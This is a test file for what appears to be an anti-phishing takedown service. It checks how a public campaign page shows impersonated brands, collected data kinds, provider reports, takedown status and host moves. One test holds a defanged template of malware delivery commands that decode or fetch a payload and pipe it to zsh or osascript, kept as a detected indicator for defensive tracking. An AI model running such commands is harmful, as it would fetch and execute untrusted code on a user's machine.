import { describe, expect, test } from "bun:test";

import { useTemporaryDatabase } from "../db/test_helpers";
import { SubmissionsEntity } from "../db/entities/submissions";
import { getReportsForSubmission } from "../submissions/abuse_details";
import { seedTrylevoReports, trylevoAt } from "../submissions/trylevo_reports.fixtures";
import { AbuseRepository } from "../abuse/repository";
import { HOST_MOVED_EVENT, hostMoveText, type HostMove } from "../liveness/moves";
import { recordSiteCheck } from "../liveness/repository";
import type { WebsiteSiteAssessment } from "../website/types";
import type { ExtractedIndicator } from "./indicators";
import { getPublicCampaign, siteTakedown, type PublicSiteReport } from "./public_view";
import type { CampaignSite } from "./members";
import { CampaignRepository } from "./repository";
import { confirmedCase } from "./test_sites";

useTemporaryDatabase();

const GOOGLE = { name: "Google", officialUrl: "https://www.google.com/" };
/** The case whose real reports stand in for a campaign site's. */
const TRYLEVO = 384401854580134038n;
const bot: ExtractedIndicator = { kind: "operator_server", value: "telegram-bot:7001", links: true, evidence: { roles: ["receives_data"], backendKind: "telegram_bot", matchedFields: ["email"] } };

const members = new Map<bigint, CampaignSite>();
const memberOf = (id: bigint) => members.get(id)!;

/** A confirmed site whose analysis found the page impersonating `brand`, with the fields it labels. */
async function site(id: bigint, host: string, assessment: Partial<WebsiteSiteAssessment> = {}, indicators: ExtractedIndicator[] = [bot]) {
	const [member] = await confirmedCase(id, { url: `https://${host}/`, routes: [{ hops: [], siteAssessments: [{ hopIndex: 0, finding: "phishing", phishingBasis: "credential_theft", ...assessment }] }] });
	members.set(id, member!);
	await CampaignRepository.recordIndicators(member!, indicators);
	await CampaignRepository.saveSiteFacts(member!, { language: null, thumbnailArtifactId: null, blankCapture: false });
	return (await CampaignRepository.campaignForMember(member!))!;
}

const field = (placeholder: string) => ({ ref: placeholder, control: "input[type=text]", placeholder });

describe("what the public page tells a campaign's visitors", () => {
	test("without guidance: the brand with its domain and no links, and what the pages ask for in page order", async () => {
		const campaign = await site(1n, "samtjo-test.com", { impersonatedBrand: GOOGLE, collectionFields: [field("Mật khẩu"), field("Email or phone")] });
		await site(2n, "other-test.com", { impersonatedBrand: GOOGLE, collectionFields: [field("Enter code")] });
		await CampaignRepository.saveSiteFacts(memberOf(1n), { language: null, thumbnailArtifactId: 7n, blankCapture: true });
		const view = (await getPublicCampaign(campaign))!;
		expect(view.visitor).toEqual({
			brand: { name: "Google", officialUrl: "https://www.google.com/", domain: "google.com", links: {} },
			kinds: ["email", "password", "code", "phone"],
		});
		expect(view.sites.map((entry) => [entry.host, entry.blankCapture, entry.thumbnailUrl])).toEqual([["samtjo-test.com", true, "/api/artifacts/7"], ["other-test.com", false, undefined]]);
	});

	test("with guidance for the brand: its sign-in host, its links and the kinds it adds; guidance for another brand is not shown", async () => {
		const campaign = await site(1n, "a-test.com", { impersonatedBrand: GOOGLE, collectionFields: [field("Password")] });
		const links = { recover: "https://accounts.google.com/signin/recovery", security: "https://myaccount.google.com/security" };
		await CampaignRepository.saveVisitorGuidance(campaign, { brand: { ...GOOGLE, domain: "google.com" }, signInHost: "accounts.google.com", kinds: ["phone"], links });
		expect((await getPublicCampaign(campaign))!.visitor).toEqual({
			brand: { ...GOOGLE, domain: "google.com", signInHost: "accounts.google.com", links },
			// The bot received an email address; the page labels a password; the guidance adds the phone.
			kinds: ["email", "password", "phone"],
		});

		await CampaignRepository.saveVisitorGuidance(campaign, { brand: { name: "Microsoft", officialUrl: "https://www.microsoft.com/", domain: "microsoft.com" }, signInHost: "login.live.com", kinds: ["card"], links: { recover: "https://account.live.com/password/reset" } });
		expect((await getPublicCampaign(campaign))!.visitor).toEqual({ brand: { ...GOOGLE, domain: "google.com", links: {} }, kinds: ["email", "password"] });
	});

	test("without a brand: no brand, and a payment page asks for a payment", async () => {
		const campaign = await site(1n, "pay-test.com", { phishingBasis: "payment_fraud" }, []);
		expect((await getPublicCampaign(campaign))!.visitor).toEqual({ kinds: ["payment"] });
	});

	test("a shared delivery command is shown as a defanged template and a reason; one that links nothing is not", async () => {
		const template = `echo "<url>"; echo '<base64>' | base64 -d | zsh\ncurl -sfL <url> | osascript -l JavaScript`;
		const delivery = (value: string, links: boolean): ExtractedIndicator => ({ kind: "delivery_command", value, links, evidence: { template, shown: "echo x", interpreters: ["osascript"] } });
		await site(1n, "one-test.app", {}, [delivery("a".repeat(64), true), delivery("b".repeat(64), false)]);
		const campaign = await site(2n, "two-test.app", {}, [delivery("a".repeat(64), true), delivery("b".repeat(64), false)]);
		const view = (await getPublicCampaign(campaign))!;
		expect(view.technical.deliveries).toEqual([{ template: `echo "<url>" [then] echo '<base64>' [pipe] base64 -d [pipe] zsh\ncurl -sfL <url> [pipe] osascript -l JavaScript`, siteCount: 2 }]);
	});

	test("a site's reports read as the case page reads them, the strongest first, and its takedown follows from them", async () => {
		const campaign = await site(1n, "trylevo-test.app");
		await SubmissionsEntity.create({ id: TRYLEVO, kind: "website", data: { kind: "website", website: { url: "https://trylevo.app/" } }, dedupeKey: "website-trylevo.app", status: "reported" });
		await seedTrylevoReports(TRYLEVO);
		const loadSiteReports = async () => (await getReportsForSubmission(TRYLEVO)).filter((report) => report.subject === "site");
		const [view] = (await getPublicCampaign(campaign, { loadSiteReports }))!.sites;
		// Cloudflare, a CDN, restricted access: the site counts as taken down, not merely blocklisted.
		expect(view!.takedown).toBe("taken_down");
		expect(view!.reports.map((report) => [report.organisation, report.role, report.bucket])).toEqual([
			["Cloudflare", "cdn", "action_taken"],
			["NameSilo", "registrar", "received"],
			["Netcraft", "blocklist", "declined"],
			["Sollutium-NL", "host", "waiting"],
		]);
		expect(view!.reports[0]).toMatchObject({ label: "Access restricted", quoted: true, ticket: "983629f3ca31bae5" });
		// What happens next is said for an open report only; no correspondence reaches the page.
		expect(view!.reports[0]!.next).toBeUndefined();
		expect(view!.reports[3]!.next).toBeDefined();
		expect(JSON.stringify(view!.reports)).not.toContain("subject");
		expect(view!.moved).toBeUndefined();
	});

	test("a site that left the CDN that acted on it and still serves: moved, in the case page's words, and only reported again", async () => {
		const campaign = await site(1n, "trylevo-test.app");
		await SubmissionsEntity.create({ id: TRYLEVO, kind: "website", data: { kind: "website", website: { url: "https://trylevo.app/" } }, dedupeKey: "website-trylevo.app", status: "reported" });
		const { site: owner } = await seedTrylevoReports(TRYLEVO);
		// What the liveness check recorded when trylevo.app left Cloudflare (liveness/host_move.ts).
		const move: HostMove = {
			key: `${owner.targetId}:routed:cdn:Cloudflare->as:43641`,
			targetId: owner.targetId.toString(),
			at: "2026-11-26T21:30:05.000Z",
			since: "2026-11-26T18:50:04.000Z",
			kind: "left_cdn",
			from: { name: "Cloudflare", cdn: "Cloudflare", asn: 13335, holder: "Cloudflare, Inc.", addresses: ["188.114.96.2", "188.114.97.2"] },
			to: { name: "Sollutium-NL", asn: 43641, holder: "Sollutium-NL SOLLUTIUM EU Sp z.o.o.", addresses: ["85.137.52.128"] },
			content: "served",
			evidence: { url: "https://trylevo.app/", state: "online", httpStatus: 200, server: "nginx/1.30.0", kitFiles: [{ url: "https://trylevo.app/js/demo.js", sha256: "d76e0b31a267064a315158b8e2937ed6de2871f842edb45b60b9107f411a0a8e" }] },
		};
		await AbuseRepository.appendEvent({ reportId: owner.reportId, targetId: owner.targetId, eventType: HOST_MOVED_EVENT, data: move });
		const loadSiteReports = async () => (await getReportsForSubmission(TRYLEVO)).filter((report) => report.subject === "site");

		const [view] = (await getPublicCampaign(campaign, { loadSiteReports }))!.sites;
		expect(view!.moved).toEqual({ at: "2026-11-26T21:30:05.000Z", kind: "left_cdn", content: "served", to: { name: "Sollutium-NL", asn: 43641 }, allegation: "malware" });
		expect(hostMoveText(view!.moved!, view!.moved!.allegation)).toBe("Moved to Sollutium-NL (AS43641) at 26 Nov 21:30 UTC — still serving malware");
		expect(hostMoveText(view!.moved!, view!.moved!.allegation, "de")).toBe("Umgezogen zu Sollutium-NL (AS43641) am 26. Nov. 21:30 UTC – verbreitet weiter Schadsoftware");
		// Cloudflare's restriction no longer stands for the site: bypassed, and the site is only reported.
		expect(view!.reports[0]).toMatchObject({ organisation: "Cloudflare", bucket: "bypassed", label: "Block bypassed" });
		expect(view!.takedown).toBe("reported");
		// No evidence of the check leaves the server.
		expect(JSON.stringify(view!.moved)).not.toContain("85.137.52.128");

		// A later check found the new host took it down: the move is settled.
		await recordSiteCheck(owner, { url: "https://trylevo.app/", state: "host_suspended", resolvedAddresses: ["85.137.52.128"], domainStatuses: [], checkedAt: trylevoAt("23:30:00") });
		const [after] = (await getPublicCampaign(campaign, { loadSiteReports }))!.sites;
		expect(after!.moved).toBeUndefined();
		expect(after!.takedown).toBe("taken_down");
	});
});

describe("how far a site's takedown got", () => {
	const report = (role: PublicSiteReport["role"], bucket: PublicSiteReport["bucket"]) => ({ role, bucket });
	test("a host, registrar, CDN or platform acting takes it down; a blocklist acting only blocklists it", () => {
		for (const role of ["host", "registrar", "cdn", "platform"] as const) expect(siteTakedown([report("blocklist", "action_taken"), report(role, "action_taken")])).toBe("taken_down");
		expect(siteTakedown([report("blocklist", "action_taken"), report("host", "waiting")])).toBe("blocklisted");
	});

	test("a report a provider has, whatever it decided, counts as reported; only reports that never went out are a problem", () => {
		for (const bucket of ["received", "declined", "unconfirmed", "waiting"] as const) expect(siteTakedown([report("host", bucket), report("registrar", "not_sent")])).toBe("reported");
		expect(siteTakedown([report("host", "not_sent"), report("registrar", "not_sent")])).toBe("problem");
		expect(siteTakedown([])).toBe("none");
	});
});
